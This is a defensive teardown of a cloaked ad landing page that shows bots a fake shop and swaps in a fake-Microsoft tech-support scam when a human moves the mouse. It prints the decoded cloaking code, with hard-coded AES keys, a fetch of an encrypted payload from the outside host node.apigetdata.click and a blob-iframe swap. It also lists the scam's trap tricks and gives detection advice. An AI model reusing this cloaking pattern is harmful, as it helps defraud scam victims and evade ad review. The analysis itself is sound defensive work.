🕵️ Cloak·Teardown 📚 Study guide TL;DR Two faces The switch Internals The scam Catch it Glossary
● Defensive post-mortem · live specimen

One link, two completely different pages.

This is a full teardown of a real cloaked ad landing page. To Google's review bots it's a harmless shop. To a human who moves their mouse, it silently swaps itself for a fake-Microsoft tech-support scam — loaded from a second, hidden server. Here's exactly how the trick works.

specimen: kelveronia.nyc3.cdn.digitaloceanspaces.com/index.html?…&gclid=…  ·  reached via a Google Ads click (gclid present)

00The one-line version

Cloaking = showing a clean "white" page to reviewers/bots and a bad "black" page to real victims, from the same URL. This specimen decides which one you get based on a single signal: did the mouse move? Bots don't move a mouse. Humans do. That one line is the whole gate.

⚠️ Do not open the live link. The "black" page hijacks fullscreen, plays a scare-voice, blocks you from closing the tab, and pushes a fake support number. Everything below was captured in isolation with scripts disabled.

01The two faces

Same link. The only difference is who's looking.

✅ WHITE page — shown to bots & ad reviewers
A boring fake store, "ShopEase," with a "Loading… please wait" popup. 100% policy-compliant. This is all Google's automated review ever sees, because a reviewer's browser never moves the mouse.
🚨 BLACK page — shown to real humans
The instant a real mouse moves, the shop is replaced by this: a fake "Microsoft Support" lockscreen with a fake command prompt and a "call this number now" popup — a classic tech-support scam.
🖱️ trigger to flip: a single mousemove 🧬 tailored variant served for Windows vs Mac

02How the switch happens

Step by step, from the moment the page loads. Amber tags explain why each step exists.

1
Load the clean shop. The page opens as the "ShopEase" store with a full-screen white "Loading…" popup on top. Nothing bad is present in the page yet.
Why: a static scan of the file finds only a harmless store.
2
Wait for a mouse move. A single window.addEventListener("mousemove", …, {once:true}) sits and waits. Until the mouse moves, nothing else happens.
Why: Google/FB review bots and headless crawlers don't move a mouse → they stay on the white page forever.
3
Decrypt the hidden home-base URL. A scrambled string in the page is AES-decrypted (key is also in the page) into the address of a second server: node.apigetdata.click.
Why: the real server never appears in plain text, so it survives a quick source read.
4
Phone home for the payload. It fetches node.apigetdata.click/data?platform=win (or mac). The server replies with a ~4 MB blob of encrypted text — the "garbage" you noticed.
Why: the bad content lives off-site and only ships to the right platform, on demand.
5
Decrypt the black page. That blob is AES-decrypted (second key, also in the page) into a complete HTML scam page with 48 images baked in.
Why: even if a scanner grabs the network response, it just sees ciphertext.
6
Swap it in via a blob iframe. The decrypted HTML is turned into a blob: URL and dropped into a hidden <iframe>; the shop is hidden, the iframe is shown.
Why: the scam renders from an in-memory blob: address — there's no real URL to report, blocklist, or crawl.

03The internals (decoded)

Everything the page tried to hide — pulled out using the keys it left sitting in its own source.

Decoy (white) page"ShopEase" — fake single-page store
Hidden origin (decrypted)https://node.apigetdata.click bad
Payload endpoint/data?platform=win | mac  → ~4.4 MB ciphertext
CryptoCryptoJS AES · 2 hard-coded keys (URL key + payload key)
Render trickBlob URL → hidden <iframe> (no crawlable URL)
Flip triggerfirst mousemove only
DeliveryGoogle Ads (gclid in the link)
Analytics on the cloakerGA4, Plausible-style, Histats — so they measure conversions

The actual gate, from the page source:

// two keys, sitting right there in the page:
const PASSPHRASE = "98yNCjeAfWMwk0wI";   // decrypts the scam payload
const URL_KEY    = "UrLk3yShopEase01";   // decrypts the hidden server URL
const ENC_DATA_ORIGIN = "U2FsdGVkX18Q…";    // → https://node.apigetdata.click

async function loadSecret() {
  const res  = await fetch(DATA_URL + "?platform=" + detectPlatform());
  const { cipher } = await res.json();
  const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(...);  // the scam
  const blob = new Blob([html], { type: "text/html" });
  frame.src = URL.createObjectURL(blob);   // scam lives at a blob: URL
  shop.style.display  = "none";    // hide white
  frame.style.display = "block";   // show black
}

// THE ENTIRE GATE — humans move a mouse, review bots don't:
window.addEventListener("mousemove", () => loadSecret(), { once: true });

04What the victim actually gets

The decrypted black page is a full tech-support scam. Windows and Mac get slightly different skins.

🚨 platform=win
Fake Microsoft Support page + fake CMD window.
🚨 platform=mac
"SecurityCenter" variant served to Mac visitors.
Scam typeFake "Microsoft Support" / virus lockout
Call-center number+1-866-881-5397 report this
Pressure tricksautoplay scare-voice · fake CMD window · "virus / trojan / spyware / porn detected" · "do not restart"
Trap tricksrequestFullscreen · onbeforeunload (can't close) · 22× preventDefault (keys/right-click killed)
Indexing<meta robots="noindex,nofollow"> — hides from search too

05How you'd catch (and kill) it

The same knowledge, pointed the other way. This is what a reviewer, scanner, or host abuse-team would do.

  • Fire synthetic input. Drive the page headless and dispatch a real mousemove. The cloak flips and reveals itself — this alone defeats the whole gate.
  • Watch outbound requests. A "shop" that, on mouse-move, fetches a big payload from a different domain (here node.apigetdata.click) is the tell. Flag CDN-hosted HTML that calls a second origin.
  • Flag the combo. crypto-js + a blob: iframe + a one-time input listener is a cloaking fingerprint, not a real store.
  • Report the artifacts. Abuse-report the payload host (apigetdata.click), the DigitalOcean Space, and the phone number +1-866-881-5397; the gclid ties it to a Google Ads account that can be reported.
  • Blob URLs aren't invisible. They have no crawlable address, but the decrypted HTML sits in memory — capture it after the flip, exactly as done here.

The takeaway: the cloak is only strong against a passive look. One synthetic mouse-move and one look at outbound traffic collapses it completely.

06Glossary — the guide's jargon, in plain English

Mapping the terms from that "integration" doc to what we actually saw here.

White page / Black page+
White = the safe, compliant page shown to reviewers and bots (the fake shop). Black = the real, rule-breaking page shown to human targets (the scam). Cloaking is just: automatically pick which one to show.
Fail URL+
The page the visitor lands on first — the one whose domain you point at the service. It's the shell that decides white-vs-black. Here it's the DigitalOcean-hosted index.html.
"JavaScript (Hosted)" + the <script src="//track…"> tag+
Instead of running server code, you just drop one script tag on your page. That script is the brain that runs the white/black decision in the visitor's browser — same idea as the loadSecret() logic we decoded, just delivered by the vendor.
Cloudflare A-record, "proxied" (orange cloud), Auto SSL+
Points a subdomain (e.g. track.yoursite.com) at the vendor's server, with Cloudflare sitting in front. "Proxied" hides the real server IP and gives free HTTPS — so the setup looks like it's just your own domain.
Deadbolt+
The vendor's name for a campaign mode used when one Fail URL is shared by several campaigns — it just tells the script "this is the default one." Housekeeping, not a security feature.
referrerpolicy="unsafe-url"+
Forces the browser to send the full referring URL (query string and all) to the vendor. That lets the cloak read campaign/traffic-source info to help decide who's a real target vs a reviewer.
?device=mobile&ad=…&site=yahoo.com+
Signals the cloak uses to fine-tune the decision and to route the right "black" variant — mirroring the ?platform=win|mac switch we saw fetch a Windows- or Mac-specific scam.
Defensive teardown for security-analysis purposes. Captured in isolation; no live payload executed. Artifacts (host, phone number, keys) documented so they can be reported. Do not visit the specimen.
